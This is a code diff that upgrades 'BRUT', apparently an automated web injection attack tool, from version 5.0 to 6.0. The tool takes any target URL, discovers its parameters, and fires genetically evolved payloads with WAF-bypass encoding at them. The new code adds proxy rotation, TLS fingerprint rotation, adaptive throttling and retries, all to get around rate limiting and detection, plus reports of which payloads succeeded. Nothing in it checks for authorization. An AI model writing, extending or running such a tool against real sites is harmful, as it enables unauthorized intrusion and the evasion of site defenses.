@@ -2956,7 +3427,7 @@ class Injector:
 
 
 # ============================================================
-# REPORT SAVER (enhanced with evolution log)
+# REPORT SAVER (v6.0 enhanced)
 # ============================================================
 class ReportSaver:
     def __init__(self, target, output_dir="./brut_results"):
@@ -2967,7 +3438,8 @@ class ReportSaver:
         self.output_dir = output_dir
         os.makedirs(output_dir, exist_ok=True)
 
-    def save(self, results, payloads, learner=None, schema=None, evolver=None):
+    def save(self, results, payloads, learner=None, schema=None,
+             evolver=None, proxy_manager=None, throttler=None):
         now = datetime.now()
         folder = os.path.join(self.output_dir, f"list-payload-for-{self.domain_clean}-{now.strftime('%Y')}")
         os.makedirs(folder, exist_ok=True)
@@ -2980,12 +3452,20 @@ class ReportSaver:
         blocked = [r for r in results if r.response_type == "blocked"]
 
         with open(txt_path, "w", encoding="utf-8") as f:
-            f.write(f"{'='*80}\n  BRUT v5.0 — Genetic ML Payload Evolution Report\n")
+            f.write(f"{'='*80}\n  BRUT v6.0 — Anti-Rate-Limit Genetic ML Report\n")
             f.write(f"  Target: {self.target}\n")
             f.write(f"  Date: {now.strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write(f"  Total: {len(results)} payloads tested\n")
             if learner: f.write(f"  ML: {learner.get_learning_summary()}\n")
             if evolver: f.write(f"  Genetic: {evolver.get_generation_summary()}\n")
+            if proxy_manager:
+                stats = proxy_manager.get_pool_stats()
+                f.write(f"  Proxy: {stats['total']} total, {stats['healthy']} healthy, "
+                       f"{stats['blacklisted']} blacklisted\n")
+            if throttler:
+                stats = throttler.get_stats()
+                f.write(f"  Throttle: {stats['total_throttle_time']} total wait, "
+                       f"{stats['requests_last_60s']}/60s\n")
             f.write(f"{'='*80}\n\n")
 
             f.write(f"[✓] SERVER OUTPUT (SUCCESS): {len(server)}\n{'='*80}\n\n")
@@ -2994,6 +3474,7 @@ class ReportSaver:
                 f.write(f"   Status: {r.status_code} ({get_status_meaning(r.status_code)})\n")
                 f.write(f"   Time: {r.response_time_ms:.0f}ms | Anomaly: {r.anomaly_score:.1f}\n")
                 f.write(f"   Context: {r.injection_context}\n")
+                f.write(f"   Proxy: {r.proxy_used} | TLS: {r.tls_fingerprint}\n")
                 f.write(f"   Evidence: {r.evidence}\n")
                 f.write(f"   Snippet: {r.response_snippet}\n")
                 f.write(f"   Payload: {r.payload[:300]}\n\n")
@@ -3004,7 +3485,8 @@ class ReportSaver:
 
             f.write(f"\n[✗] BLOCKED: {len(blocked)}\n{'='*80}\n\n")
             for i, r in enumerate(blocked, 1):
-                f.write(f"#{i} | {r.payload_id} | {r.category} | {r.parameter} | {r.evidence}\n")
+                f.write(f"#{i} | {r.payload_id} | {r.category} | {r.parameter} | "
+                       f"Status: {r.status_code} | Proxy: {r.proxy_used[:30]} | {r.evidence}\n")
 
             if schema:
                 f.write(f"\n\n{'='*80}\n  EVOLUTION LOG\n{'='*80}\n\n")
@@ -3013,6 +3495,12 @@ class ReportSaver:
                     f.write(f"  Gen {entry['gen_num']} | {entry['gen_id']} | "
                            f"{entry['category']} | fit={entry['fitness']:.3f} | "
                            f"alive={entry['alive']} | muts={entry['mutations']}\n")
+
+                if schema.rate_limit_events:
+                    f.write(f"\n  RATE LIMIT EVENTS ({len(schema.rate_limit_events)}):\n")
+                    for evt in schema.rate_limit_events[-20:]:
+                        f.write(f"    {evt['timestamp']} | proxy={evt['proxy'][:30]} | "
+                               f"delay={evt['throttle_delay']:.1f}s\n")
 
         with open(json_path, "w", encoding="utf-8") as f:
             json.dump({
@@ -3023,7 +3511,9 @@ class ReportSaver:
                     "raw_html": len(raw), "blocked": len(blocked),
                     "ml": learner.get_learning_summary() if learner else "",
                     "genetic": evolver.get_generation_summary() if evolver else "",
-                    "version": "5.0",
+                    "proxy_stats": proxy_manager.get_pool_stats() if proxy_manager else {},
+                    "throttle_stats": throttler.get_stats() if throttler else {},
+                    "version": "6.0",
                 },
                 "server_response": [r.to_dict() for r in server],
                 "raw_html": [r.to_dict() for r in raw],
@@ -3032,13 +3522,14 @@ class ReportSaver:
                 "evolution_log": schema.get_evolution_log() if schema else [],
                 "blocked_mutations": list(schema.blocked_mutations) if schema else [],
                 "successful_chains": schema.successful_chains if schema else [],
+                "rate_limit_events": schema.rate_limit_events if schema else [],
             }, f, indent=2, ensure_ascii=False)
 
         return txt_path, json_path
 
 
 # ============================================================
-# DETAILED LOGGER
+# DETAILED LOGGER (v6.0 enhanced with proxy/TLS info)
 # ============================================================
 class DetailedLogger:
     @staticmethod
@@ -3047,6 +3538,8 @@ class DetailedLogger:
             symbol = "\033[1;32m[✓]\033[0m"
         elif result.response_type == "raw_html":
             symbol = "\033[37m[~]\033[0m"
+        elif result.status_code == 429:
+            symbol = "\033[1;33m[⏳]\033[0m"
         else:
             symbol = "\033[31m[✗]\033[0m"
 
@@ -3056,6 +3549,8 @@ class DetailedLogger:
 
         if result.response_type == "server_output":
             type_label = "\033[1;32mSERVER OUTPUT\033[0m"
+        elif result.status_code == 429:
+            type_label = "\033[1;33mRATE LIMITED\033[0m"
         elif result.response_type == "raw_html":
             type_label = "\033[37mraw HTML\033[0m"
         else:
@@ -3065,31 +3560,47 @@ class DetailedLogger:
         if len(result.payload) > 80: payload_display += "..."
         snippet = result.response_snippet[:60].replace('\n', ' ').replace('\r', '')
 
+        # v6.0: Show proxy and TLS info
+        proxy_short = result.proxy_used[:25] if result.proxy_used else "DIRECT"
+        tls_short = result.tls_fingerprint[:15] if result.tls_fingerprint else "N/A"
+
         print(f"  {symbol} \033[33m[{index}/{total}]\033[0m "
               f"\033[35m{result.category:<8}\033[0m → "
               f"\033[37m{result.parameter:<12}\033[0m | "
               f"{type_label} | "
-              f"Status: {status_str} ({status_meaning[:25]}) | "
+              f"Status: {status_str} ({status_meaning[:20]}) | "
               f"⏱ {time_str}")
 
         print(f"         \033[90mPayload : \033[0m{payload_display}")
-        if snippet:
+        if snippet and result.status_code != 429:
             print(f"         \033[90mResponse: \033[0m{snippet}")
+        print(f"         \033[90mProxy   : \033[0m{proxy_short} | "
+              f"\033[90mTLS: \033[0m{tls_short}")
         if result.success:
             print(f"         \033[1;32m⚡ Evidence: {result.evidence}\033[0m")
-            print(f"         \033[1;36m📍 Context: {result.injection_context} | Anomaly: {result.anomaly_score:.1f}\033[0m")
+            print(f"         \033[1;36m📍 Context: {result.injection_context} | "
+                  f"Anomaly: {result.anomaly_score:.1f}\033[0m")
             print()
 
 
 # ============================================================
-# MAIN PIPELINE v5.0
+# MAIN PIPELINE v6.0
 # ============================================================
 class BRUTPipeline:
-    def __init__(self, target):
+    def __init__(self, target, proxy_file: str = None):
         self.target = target
         self.parameters: List[Parameter] = []
         self.payloads: List[Dict] = []
         self.results: List[InjectionResult] = []
+
+        # v6.0: Initialize anti-rate-limit engines
+        self.proxy_manager = ProxyPoolManager()
+        if proxy_file:
+            self.proxy_manager.load_proxies_from_file(proxy_file)
+        self.tls_engine = TLSFingerprintEngine()
+        self.throttler = AdaptiveThrottler()
+
+        # Existing engines
         self.learner = FeedbackLearner()
         self.schema = EvolutionSchema()
         self.grammar = GrammarValidator()
@@ -3105,7 +3616,19 @@ class BRUTPipeline:
         self.evolver = GeneticEvolver(
             self.schema, self.grammar, self.encoder, self.waf_bypass
         )
-        self.injector = Injector(target)
+
+        # v6.0: Retry engine
+        self.retry_engine = RetryEngine(
+            self.throttler, self.proxy_manager, self.tls_engine
+        )
+
+        self.injector = Injector(
+            target,
+            proxy_manager=self.proxy_manager,
+            tls_engine=self.tls_engine,
+            throttler=self.throttler,
+            retry_engine=self.retry_engine,
+        )
         self.saver = ReportSaver(target)
         self.logger = DetailedLogger()
 
@@ -3117,9 +3640,7 @@ class BRUTPipeline:
     def phase2_generate(self, count):
         if count <= 0: return []
         self.payloads = self.generator.generate(count)
-        # Initialize genetic population
         self.evolver.initialize_population(self.payloads)
-        # Create evolution records
         for p in self.payloads:
             record = self.schema.create_record(p)
             p["generation_id"] = record.generation_id
@@ -3130,11 +3651,20 @@ class BRUTPipeline:
         total = len(self.payloads) * len(self.parameters)
         tested = 0
         found_success = False
+        rate_limit_count = 0
 
         print(f"\n\033[36m[*]\033[0m Starting injection: "
               f"{len(self.payloads)} payloads × {len(self.parameters)} parameters")
         print(f"    Total: {total} | Mode: {'MAX' if max_mode else 'NORMAL'}")
         print(f"    Genetic: Active | Grammar: Validated | Encoding: {self.encoder.get_rotation_summary()}")
+
+        # v6.0: Show anti-rate-limit status
+        proxy_stats = self.proxy_manager.get_pool_stats()
+        tls_fp = self.tls_engine.get_current_fingerprint()
+        print(f"    Proxy: {proxy_stats['total']} proxies ({proxy_stats['healthy']} healthy) | "
+              f"TLS: {tls_fp}")
+        print(f"    Throttle: {self.throttler.min_delay}-{self.throttler.max_delay}s jitter | "
+              f"Backoff: auto")
         print(f"\033[33m{'─'*100}\033[0m")
 
         for param in self.parameters:
@@ -3147,41 +3677,44 @@ class BRUTPipeline:
                     self.results.append(result)
                     self.learner.record_feedback(payload_dict, result)
 
-                    # Record in evolution schema
                     gen_id = payload_dict.get("generation_id", "")
                     if gen_id:
                         self.schema.record_feedback(
                             gen_id, result.status_code,
                             result.evidence, result.response_type,
                             result.anomaly_score,
-                            self.learner.waf_type if self.learner.waf_detected else ""
+                            self.learner.waf_type if self.learner.waf_detected else "",
+                            proxy_used=result.proxy_used,
+                            tls_fp=result.tls_fingerprint,
+                            throttle_delay=result.throttle_delay_ms / 1000.0,
                         )
 
-                    # Update genetic fitness
                     fitness = self.schema.records.get(gen_id, None)
                     if fitness:
                         self.evolver.update_fitness(
-                            payload_dict["id"],
-                            fitness.fitness_score
+                            payload_dict["id"], fitness.fitness_score
                         )
 
-                    # Update encoding rotation
                     self.encoder.record_result(
-                        self.encoder.current_chain_index,
-                        result.success
+                        self.encoder.current_chain_index, result.success
                     )
 
                     self.logger.log_result(tested, total, result)
 
+                    # v6.0: Track rate limiting
+                    if result.status_code == 429:
+                        rate_limit_count += 1
+                        if rate_limit_count % 5 == 0:
+                            print(f"\n  \033[1;33m[RATE LIMIT]\033[0m "
+                                  f"{rate_limit_count} rate limits encountered. "
+                                  f"Throttler adapting...")
+                            self.throttler.print_stats()
+                            self.proxy_manager.print_pool_status()
+                            print()
+
                     if result.success:
                         found_success = True
                         if max_mode: break
-
-                # Rate limiting
-                if result and result.response_time_ms > 3000:
-                    time.sleep(random.uniform(0.5, 1.0))
-                else:
-                    time.sleep(random.uniform(0.08, 0.25))
 
                 # Periodic summaries
                 if tested % 50 == 0 and tested > 0:
@@ -3189,14 +3722,18 @@ class BRUTPipeline:
                     if ml != "Learning...":
                         print(f"\n  \033[1;36m[ML]\033[0m {ml}")
                         print(f"  \033[1;36m[GENETIC]\033[0m {self.evolver.get_generation_summary()}")
-                        print(f"  \033[1;36m[ENCODING]\033[0m {self.encoder.get_rotation_summary()}\n")
+                        print(f"  \033[1;36m[ENCODING]\033[0m {self.encoder.get_rotation_summary()}")
+                        self.throttler.print_stats()
+                        print()
 
                 if tested % 100 == 0 and tested > 0:
-                    # Evolve next generation
                     new_pop = self.evolver.evolve_generation()
                     print(f"\n  \033[1;35m[EVOLUTION]\033[0m Generation {self.evolver.generation}: "
-                          f"{len(new_pop)} evolved payloads ready\n")
-                    # Replace payloads with evolved ones for remaining params
+                          f"{len(new_pop)} evolved payloads ready")
+                    # Rotate TLS fingerprint every 100 requests
+                    self.tls_engine._rotate_target()
+                    print(f"  \033[1;35m[TLS]\033[0m Fingerprint rotated to: "
+                          f"{self.tls_engine.get_current_fingerprint()}\n")
                     self.payloads = new_pop
                     for p in self.payloads:
                         if "generation_id" not in p:
@@ -3236,24 +3773,35 @@ class BRUTPipeline:
 
     def phase4_save(self):
         return self.saver.save(self.results, self.payloads,
-                              self.learner, self.schema, self.evolver)
+                              self.learner, self.schema, self.evolver,
+                              self.proxy_manager, self.throttler)
 
     def print_summary(self):
         server = [r for r in self.results if r.response_type == "server_output"]
         raw = [r for r in self.results if r.response_type == "raw_html"]
         blocked = [r for r in self.results if r.response_type == "blocked"]
+        rate_limited = [r for r in self.results if r.status_code == 429]
 
         print(f"\n\033[1;36m{'='*80}")
-        print(f"  BRUT v5.0 — GENETIC ML INJECTION SUMMARY")
+        print(f"  BRUT v6.0 — ANTI-RATE-LIMIT GENETIC ML SUMMARY")
         print(f"{'='*80}\033[0m")
         print(f"  Total tested         : {len(self.results)}")
         print(f"  \033[32m✓ Server output\033[0m      : {len(server)}")
         print(f"  \033[37m~ Raw HTML\033[0m           : {len(raw)}")
         print(f"  \033[31m✗ Blocked\033[0m            : {len(blocked)}")
+        print(f"  \033[33m⏳ Rate Limited (429)\033[0m  : {len(rate_limited)}")
 
         print(f"\n  \033[1;35mML Learning:\033[0m {self.learner.get_learning_summary()}")
         print(f"  \033[1;35mGenetic:\033[0m {self.evolver.get_generation_summary()}")
         print(f"  \033[1;35mEncoding:\033[0m {self.encoder.get_rotation_summary()}")
+
+        # v6.0: Anti-rate-limit summary
+        print(f"\n  \033[1;35m{'─'*40} ANTI-RATE-LIMIT {'─'*40}\033[0m")
+        self.proxy_manager.print_pool_status()
+        self.throttler.print_stats()
+        print(f"  \033[1;36m[TLS]\033[0m Current fingerprint: {self.tls_engine.get_current_fingerprint()}")
+        retry_stats = self.retry_engine.get_retry_stats()
+        print(f"  \033[1;36m[RETRY]\033[0m Total retries: {retry_stats['total_retries']}")
 
         self.schema.print_evolution_summary()
 
@@ -3270,11 +3818,13 @@ class BRUTPipeline:
         if server:
             print(f"\n  \033[1;32mTop Successful Payloads:\033[0m")
             for r in server[:5]:
-                print(f"    ✓ [{r.payload_id}] {r.category} | ctx={r.injection_context} | {r.evidence[:60]}")
+                print(f"    ✓ [{r.payload_id}] {r.category} | ctx={r.injection_context} | "
+                      f"proxy={r.proxy_used[:20]} | tls={r.tls_fingerprint[:12]} | "
+                      f"{r.evidence[:40]}")
 
 
 # ============================================================
-# INTERACTIVE MAIN LOOP
+# INTERACTIVE MAIN LOOP v6.0
 # ============================================================
 def interactive_main():
     print_banner()
@@ -3283,7 +3833,10 @@ def interactive_main():
         print(f"\n\033[1;33m{'─'*60}\033[0m")
         print(f"  \033[1;37mTarget Input\033[0m  (link / domain / URL / IP)")
         print(f"  Ketik \033[31m/exit\033[0m untuk keluar")
+        print(f"  Ketik \033[35m/proxy <file>\033[0m untuk load proxy list")
         print(f"\033[1;33m{'─'*60}\033[0m")
+
+        proxy_file = None
 
         try:
             target = input(f"\n  \033[1;36mBRUT\033[0m \033[33m>>\033[0m ").strip()
@@ -3294,6 +3847,17 @@ def interactive_main():
         if target.lower() in ["/exit", "exit", "/quit", "quit"]:
             print(f"\n\033[31m[*]\033[0m Goodbye!"); break
 
+        # v6.0: Proxy file loading command
+        if target.lower().startswith("/proxy "):
+            proxy_file = target[7:].strip()
+            print(f"  \033[35m[*]\033[0m Proxy file set: {proxy_file}")
+            try:
+                target = input(f"\n  \033[1;36mBRUT\033[0m \033[33m>> (now enter target URL)\033[0m ").strip()
+            except (EOFError, KeyboardInterrupt):
+                break
+            if not target or target.lower() in ["/exit", "exit"]:
+                continue
+
         if not target.startswith(("http://", "https://")):
             target = "http://" + target
 
@@ -3301,7 +3865,7 @@ def interactive_main():
         if not parsed.netloc:
             print(f"  \033[31m[!]\033[0m Target tidak valid"); continue
 
-        pipeline = BRUTPipeline(target)
+        pipeline = BRUTPipeline(target, proxy_file=proxy_file)
         params = pipeline.phase1_discover()
 
         if not params:
@@ -3327,6 +3891,14 @@ def interactive_main():
                 print(f"    ... dan {len(plist)-8} lainnya")
             print()
 
+        # v6.0: Show anti-rate-limit status before injection
+        print(f"  \033[1;35mAnti-Rate-Limit Status:\033[0m")
+        pipeline.proxy_manager.print_pool_status()
+        print(f"  \033[1;36m[TLS]\033[0m Fingerprint: {pipeline.tls_engine.get_current_fingerprint()}")
+        print(f"  \033[1;36m[THROTTLE]\033[0m Jitter: {pipeline.throttler.min_delay}-{pipeline.throttler.max_delay}s | "
+              f"Backoff: exponential auto")
+        print()
+
         try:
             confirm = input(f"  \033[1;33mLanjut injection? [Y/N] >> \033[0m").strip().lower()
         except (EOFError, KeyboardInterrupt): break
@@ -3335,7 +3907,8 @@ def interactive_main():
 
         print(f"\n\033[1;33m{'─'*60}\033[0m")
         print(f"  \033[1;37mJumlah Payload Variant\033[0m (angka / max)")
-        print(f"  \033[90mGenetic evolution akan otomatis berjalan setiap 100 test\033[0m")
+        print(f"  \033[90mGenetic evolution setiap 100 test | TLS rotate setiap 100 test\033[0m")
+        print(f"  \033[90mAdaptive throttle aktif | Proxy rotation otomatis\033[0m")
         print(f"\033[1;33m{'─'*60}\033[0m")
 
         try:
